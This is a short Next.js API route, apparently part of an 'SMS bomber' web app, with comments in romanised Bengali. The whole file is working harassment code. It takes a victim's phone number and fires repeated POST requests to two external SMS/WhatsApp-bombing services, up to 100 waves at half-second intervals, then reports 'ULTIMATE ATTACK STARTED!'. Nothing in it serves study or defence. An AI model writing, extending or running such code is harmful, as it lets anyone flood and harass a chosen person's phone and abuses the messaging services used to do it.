// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  // Target Links (Eigulo ke amra trigger korbo)
  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/'
  ];

  const runAttack = async () => {
    // Ultimate mode e 2 per second, normal e 100 limit
    const totalWaves = isUltimate ? 100 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      // Amra duiti link e ekshathe request pathabo
      // Ekhane amra 'number' ta body te pathacchi jate oi site gulo bujhte pare
      const attackPromises = targetLinks.map(link => 
        fetch(link, {
          method: 'POST', // Force POST request
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json',
          },
          body: JSON.stringify({
            number: number,
            amount: amount,
            country: "BD", // Default Bangladesh
            service: "whatsapp", // Common service for testing
            msg: "Prank Attack!" 
          }),
          mode: 'cors', // Cross-origin request enable korbe
        }).catch(err => console.log("Wave Error:", err.message))
      );

      await Promise.all(attackPromises);

      // Delay control (Ultimate mode e 0.5s, normal e 2s)
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  // Attack start
  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK IN PROGRESS... 🔥" 
  });
}
